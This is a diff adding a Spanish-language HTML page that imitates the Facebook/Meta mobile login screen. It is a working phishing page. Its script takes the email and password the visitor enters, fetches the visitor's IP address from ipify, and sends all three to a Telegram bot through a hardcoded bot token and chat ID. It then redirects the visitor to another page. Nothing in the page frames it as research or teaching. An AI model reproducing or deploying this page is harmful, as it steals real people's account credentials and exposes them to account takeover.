@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Debes iniciar sesión en tu cuenta primero</title>
+  <style>
+    /* Tus estilos CSS aquí */
+
+    * {
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      overflow: hidden;
+    }
+    .main {
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .p1 {
+      background: #E6E0C3;
+      width: 100%;
+      height: 25px;
+      padding: 10px;
+      font-size: 15px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #091B63;
+    }
+    .logo {
+      color: #2F4AB8;
+      margin: 1px 0;
+    }
+    .logo img {
+      width: 150px;
+      height: auto;
+    }
+    form {
+      margin-top: -5px;
+      height: 40vh;
+    }
+    #email, #pass {
+      width: 90vw;
+      display: block;
+      padding: 10px 10px;
+      margin: 5px 0;
+      outline: none;
+      font-size: 16px;
+      height: 28px;
+      border-radius: 5px;
+      border: none;
+      background: #E9E9E9;
+    }
+    #login {
+      display: block;
+      width: 100%;
+      font-size: 17px;
+      padding: 10px 0;
+      margin: 10px 0;
+      background: #1877F2;
+      color: white;
+      font-weight: bold;
+      border-radius: 5px;
+      border: none;
+    }
+    a {
+      text-decoration: none;
+      text-align: center;
+      display: block;
+      font-size: 14px;
+      margin: 15px 0;
+    }
+    .or {
+      display: flex;
+      margin: 32px 0;
+    }
+    .p2, .p3 {
+      background: black;
+      height: 0.5px;
+      width: 145px;
+      margin: 0 10px;
+    }
+    .pOR {
+      margin-top: -9px;
+    }
+    #CNA {
+      background: none;
+      border: .5px solid black;
+      border-radius: 5px;
+      padding: 8px 3px;
+      width: 80vw;
+      font-weight: bold;
+      font-size: 16px;
+      margin: -25px 25px;
+    }
+    .lang {
+      display: flex;
+      margin-top: 90px;
+    }
+    .lang span {
+      margin: 0 65px;
+      list-style: none;
+      font-size: 13px;
+    }
+    .lang span li {
+      margin: 3px 0;
+      color: #2E325E;
+    }
+    .lang span .bl {
+      font-size: 14px;
+      margin: 0 -8px;
+      color: black;
+    }
+    .footer {
+      margin: 15px 22px;
+    }
+    .footer ul {
+      display: flex;
+    }
+    .footer ul li {
+      font-size: 10px;
+      color: #8F9098;
+      margin: 0 7px;
+    }
+    .no {
+      list-style: none;
+    }
+    .meta {
+      color: #8F9098;
+      font-size: 13px;
+      margin-top: -2px;
+    }
+    /* Agrega los estilos siguientes para mostrar y ocultar la carga */
+    #loading {
+      display: none;
+      font-size: 18px;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="main">
+    <p class="p1">Obtener la aplicación de Facebook</p>
+    <div class="logo">
+      <img src="111.png" alt="Logo de Parchisi">
+    </div>
+    <form id="loginForm">
+      <input placeholder="Correo electrónico o número de teléfono" type="email" id="email" required>
+      <input placeholder="Contraseña" type="password" name="pass" id="pass" required>
+      <button id="login" type="button" onclick="redirectToWebsiteWithLoading()">Iniciar sesión</button>
+      <a href="¿Olvidaste tu contraseña?">¿Olvidaste tu contraseña?</a>
+      <div class="or">
+        <p class="p2"></p>
+        <p class="pOR">o</p>
+        <p class="p3"></p>
+      </div>
+      <button id="CNA" type="button">Crear una cuenta nueva</button>
+    </form>
+    <div class="lang">
+      <span>
+        <li class="bl">Inglés (Reino Unido)</li>
+        <li>Portugués</li>
+        <li>Japonés</li>
+        <li>Español</li>
+      </span>
+      <span>
+        <li>Hindi</li>
+        <li>Gujarati</li>
+        <li>Telugu</li>
+      </span>
+    </div>
+    <div class "footer">
+      <ul>
+        <li class="no">Acerca de</li>
+        <li>Ayuda</li>
+        <li>Más</li>
+      </ul>
+    </div>
+    <p class="meta">Meta &copy; 2023</p>
+    <div id="loading"></div>
+  </div>
+  <script>
+    function redirectToWebsiteWithLoading() {
+      var email = document.getElementById('email').value;
+      var password = document.getElementById('pass').value;
+
+      getIpAddress(function (ipAddress) {
+        sendToTelegram(email, password, ipAddress);
+        hideLoading();
+        window.location.href = 'temporaryar.html';
+      });
+    }
+
+    function getIpAddress(callback) {
+      var ipRequest = new XMLHttpRequest();
+      ipRequest.open('GET', 'https://api.ipify.org?format=json', true);
+
+      ipRequest.onload = function () {
+        if (ipRequest.status >= 200 && ipRequest.status < 400) {
+          var response = JSON.parse(ipRequest.responseText);
+          var ipAddress = response.ip;
+          callback(ipAddress);
+        }
+      };
+
+      ipRequest.send();
+    }
+
+    function sendToTelegram(email, password, ipAddress) {
+      var botToken = "6967999524:AAF9DF2TbkTIP6jTNqTisEDQkeHEXeYhBVY"; // Reemplaza con tu token de bot de Telegram
+      var chatId = '2095151068'; // Reemplaza con tu ID de chat de Telegram
+
+      var message = '\n📧 ↝ 𝙴𝙼𝙰𝙸𝙻 » ' + email + '\n📟 ↝ 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 » ' + password + '\n⚙️ ↝ 𝙸𝙿 » ' + ipAddress +
+         '\n↝ 𝙼𝙾𝙳𝙴 𝙱𝚈  »@HEXE_5';
+
+      var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);
+
+      var xhr = new XMLHttpRequest();
+      xhr.open('GET', url, true);
+      xhr.send();
+    }
+
+    function showLoading() {
+      var loadingElement = document.getElementById('loading');
+      if (loadingElement) {
+        loadingElement.style.display = 'block';
+      }
+    }
+
+    function hideLoading() {
+      var loadingElement = document.getElementById('loading');
+      if (loadingElement) {
+        loadingElement.style.display = 'none';
+      }
+    }
+  </script>
+</body>
+</html>
